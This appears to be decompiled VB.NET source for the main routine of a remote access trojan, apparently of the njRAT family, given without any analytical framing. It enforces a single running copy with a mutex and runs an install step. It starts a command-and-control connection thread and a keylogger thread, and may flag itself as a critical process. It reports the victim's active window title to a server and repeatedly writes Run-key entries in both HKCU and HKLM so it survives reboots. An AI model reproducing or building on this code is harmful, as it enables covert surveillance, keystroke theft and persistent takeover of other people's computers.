Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms

Namespace ClassLibrary1
    Public Class A
        ' Methods
        <CompilerGenerated(), DebuggerStepThrough()> _
        Private Shared Sub _Lambda__4(ByVal a0 As Object, ByVal a1 As SessionEndingEventArgs)
            OK.ED()
        End Sub

        <STAThread> _
        Public Shared Sub main()
            If ((Not Interaction.Command Is Nothing) AndAlso (Interaction.Command.Length > 0)) Then
                Dim strArray As String() = Strings.Split(Interaction.Command, ":", -1, CompareMethod.Binary)
                Select Case strArray(0)
                    Case "UP"
                        Try 
                            OK.F.Registry.CurrentUser.SetValue("di", "!")
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError
                        End Try
                        Try 
                            Dim processById As Process = Process.GetProcessById(Conversions.ToInteger(strArray(1)))
                            processById.WaitForExit(&H1388)
                            Try 
                                processById.Dispose
                                Exit Select
                            Catch exception11 As Exception
                                ProjectData.SetProjectError(exception11)
                                Dim exception2 As Exception = exception11
                                ProjectData.ClearProjectError
                                Exit Select
                            End Try
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception3 As Exception = exception12
                            Thread.Sleep(&H1388)
                            ProjectData.ClearProjectError
                            Exit Select
                        End Try
                        Exit Select
                    Case ".."
                        Thread.Sleep(&H1388)
                        Exit Select
                End Select
            End If
            Try 
                Mutex.OpenExisting(OK.RG)
                ProjectData.EndApp
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception4 As Exception = exception13
                Dim createdNew As Boolean = False
                OK.MT = New Mutex(True, OK.RG, createdNew)
                If Not createdNew Then
                    ProjectData.EndApp
                End If
                ProjectData.ClearProjectError
            End Try
            OK.INS
            Dim NewThread As New Thread(New ThreadStart(AddressOf OK.RC), 1)
            NewThread.Start()
            Try 
                OK.kq = New kl
                Dim NewThread2 As New Thread(New ThreadStart(AddressOf OK.kq.WRK), 1)
                NewThread2.Start()
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception5 As Exception = exception14
                ProjectData.ClearProjectError
            End Try
            Dim num As Integer = 0
            Dim str As String = ""
            If OK.BD Then
                Try 
                    AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf A._Lambda__4)
                    OK.pr(1)
                Catch exception15 As Exception
                    ProjectData.SetProjectError(exception15)
                    Dim exception6 As Exception = exception15
                    ProjectData.ClearProjectError
                End Try
            End If
            Do While True
                Thread.Sleep(&H3E8)
                Application.DoEvents
                Try 
                    num += 1
                    If (num = 5) Then
                        Try 
                            OK.EmptyWorkingSet(CLng(Process.GetCurrentProcess.Handle))
                        Catch exception16 As Exception
                            ProjectData.SetProjectError(exception16)
                            Dim exception7 As Exception = exception16
                            ProjectData.ClearProjectError
                        End Try
                    End If
                    If (num > 8) Then
                        num = 0
                        Dim str2 As String = OK.ACT
                        If (str <> str2) Then
                            str = str2
                            OK.Send(("act" & OK.Y & str2))
                        End If
                    End If
                    If OK.Isu Then
                        Try 
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception17 As Exception
                            ProjectData.SetProjectError(exception17)
                            Dim exception8 As Exception = exception17
                            ProjectData.ClearProjectError
                        End Try
                        Try 
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception18 As Exception
                            ProjectData.SetProjectError(exception18)
                            Dim exception9 As Exception = exception18
                            ProjectData.ClearProjectError
                        End Try
                    End If
                Catch exception19 As Exception
                    ProjectData.SetProjectError(exception19)
                    Dim exception10 As Exception = exception19
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

    End Class
End Namespace

